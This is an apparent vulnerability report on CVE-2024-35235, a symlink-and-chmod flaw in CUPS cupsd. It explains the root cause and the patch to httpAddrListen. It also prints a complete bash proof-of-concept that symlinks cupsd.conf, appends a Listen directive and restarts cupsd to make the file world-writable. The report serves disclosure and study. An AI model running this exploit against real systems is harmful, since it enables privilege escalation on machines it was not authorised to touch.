# CVE-2024-35235 Detailed Report

## Summary
CVE-2024-35235 is a vulnerability found in OpenPrinting CUPS (Common Unix Printing System) versions 2.4.8 and earlier. The vulnerability is classified under two CWEs: CWE-59 (Improper Link Resolution Before File Access) and CWE-252 (Unchecked Return Value). The issue arises when the cupsd server is started with a "Listen" configuration item that points to a symbolic link. This can lead to the cupsd process performing an arbitrary `chmod` operation on the provided argument, which can grant world-writable access to the target file. Since cupsd typically runs with root privileges, this vulnerability can allow an attacker to change the permissions of any user or system files to be world-writable, potentially leading to further exploitation.

## Root Cause
The root cause of the vulnerability lies in the handling of symbolic links and the lack of proper error checking in the code. Specifically, when the cupsd server attempts to set up a bind for Unix sockets using the "Listen" parameters, it does not check the return value of the `unlink` and `bind` calls. If the `unlink` call fails (for example, due to AppArmor restrictions), the subsequent `bind` call will also fail, but the code still proceeds to execute `chmod` on the symbolic link. This results in the permissions of the target file being changed to world-writable, as the `chmod` is executed regardless of whether the `bind` was successful.

The provided patch addresses this issue by:
1. Checking the return value of the `unlink` call and handling the case where the file does not exist (error code `ENOENT`).
2. Ensuring that the `bind` call is successful before proceeding to execute `chmod`, thus preventing the arbitrary permission change.

### Code Analysis
The relevant code snippet from the patch shows the changes made to the `httpAddrListen` function in `http-addr.c`:

```c
if ((status = unlink(addr->un.sun_path)) < 0) {
    DEBUG_printf("1httpAddrListen: Unable to unlink \"%s\": %s", addr->un.sun_path, strerror(errno));
    if (errno == ENOENT)
        status = 0;
}
if (!status) {
    // Bind the domain socket...
    if ((status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr))) < 0) {
        DEBUG_printf("1httpAddrListen: Unable to bind domain socket \"%s\": %s", addr->un.sun_path, strerror(errno));
    }
    // Restore the umask...
    umask(mask);
}
```

## Exploitation Details
To exploit this vulnerability, an attacker would need to manipulate the "Listen" configuration in the `cupsd.conf` file to point to a symbolic link. The following steps outline a potential exploitation scenario:

1. Create a directory and a symbolic link to the `cupsd.conf` file.
2. Modify the `cupsd.conf` to include a "Listen" directive pointing to the symbolic link.
3. Restart the cupsd service, which will trigger the vulnerability.
4. The `chmod` operation will execute, changing the permissions of the actual `cupsd.conf` file to world-writable.

This can be achieved using the provided proof-of-concept (PoC) script.

## Environment Setup Requirements
- **Port**: Not explicitly mentioned in the PoC, but typically CUPS uses port 631 for IPP (Internet Printing Protocol).
- **Target Endpoint**: The PoC modifies the `/etc/cups/cupsd.conf` file.
- **Explicit Configuration**: The PoC uses the following command to append the "Listen" directive:
  ```bash
  echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf
  ```

## Complete PoC Code
```bash
set -e
exploit() {
        echo "Staging..."
        mkdir -m 777 /tmp/stage
        ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf

        # emulate configuration access to cupsd.conf
        echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf

        echo

        echo "Current permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true

        echo

        echo "Restarting cupsd"
        sudo systemctl restart cups

        echo

        echo "New permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true
}

cleanup() {
        sudo sed -i '/Listen \/tmp\/stage\/cupsd.conf/d' /etc/cups/cupsd.conf
        sudo chmod 640 /etc/cups/cupsd.conf
        rm -rf /tmp/stage
}

$@
```

This PoC script demonstrates how to exploit the vulnerability by staging the environment, modifying the configuration, and then restarting the cupsd service to trigger the permission change. The cleanup function restores the original state after testing.